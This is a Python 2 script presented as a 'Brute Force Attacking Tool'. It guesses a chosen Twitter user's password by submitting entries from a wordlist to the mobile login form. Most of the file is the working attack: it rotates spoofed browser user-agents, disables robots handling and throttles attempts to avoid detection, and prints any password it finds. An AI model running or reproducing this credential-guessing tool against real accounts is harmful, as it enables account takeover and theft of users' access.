#!/usr/bin/env python

#-*- coding:utf-8 -*-
import mechanize
import argparse
import time
import random

def main():
	
	url = "https://mobile.twitter.com/login/error?redirect_after_login=%2F"
	userAgents = ["Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/32.0",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36", 
			"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0)",
			"Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0",
			"Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0 IceDragon/18.0.1.0",
			"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.29 Safari/537.36 OPR/15.0.1147.24 (Edition Next)",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; cs-CZ) AppleWebKit/532.4 (KHTML, like Gecko) QtWeb Internet Browser/3.3 http://www.QtWeb.net",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
			"Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0"]
	
	
	if passlist:
		password = open(passlist,"r").readlines();
	
	mech = mechanize.Browser()
	mech.set_handle_robots(False)
	## mech.addheaders = [('Referer', 'http://google.com')]
	mech.addheaders = [('User-agent', random.choice(userAgents))]
	mech.open(url) # url ac

	
	for i in password:
		#mech.open(url)
		mech.addheaders = [('User-agent', random.choice(userAgents))]
		mech.select_form(nr=0)
		mech.form["username"] = username
		mech.form["password"] = i.replace("\n","")
		mech.submit(); # post istegi yolla 
		print "[*] " + username + " -- " + i + " -- " + mech.geturl()
		if mech.geturl() != url:
			print "\n\n[+] Yes that's it"
			print "\n[+] username: %s\n[+] password: %s" %(username,i)
			break
		time.sleep(float(sleeptime))
		
	if mech.geturl() == url:
		print "\n[-] :( sorii we do not found correct password"
	print "\n[*] End [*]"
	
def argumanParser():

	parser = argparse.ArgumentParser(description='Brute Force Tool')
	parser.add_argument("-u", "--username", help="Just User Name")
	parser.add_argument("-p", "--passlist", help="Wordlist for Password")
	parser.add_argument("-s", "--sleep", help="Sleep Time Between Two Passwords (ex: for milliseconds 0.01 or 0.5)")
	args = parser.parse_args()
	return args;
	
if __name__ == '__main__':
	try:
		print """
		*******************************************
		<<<\tBrute Force Attacking Tool\t>>>

		<<<\tFor Instructions -h or --help   >>>
		*******************************************
		"""
		args = argumanParser()
		username = args.username; passlist = args.passlist;
		sleeptime = args.sleep;
		main()
	except Exception, e:
		print "Error : " + str(e)
		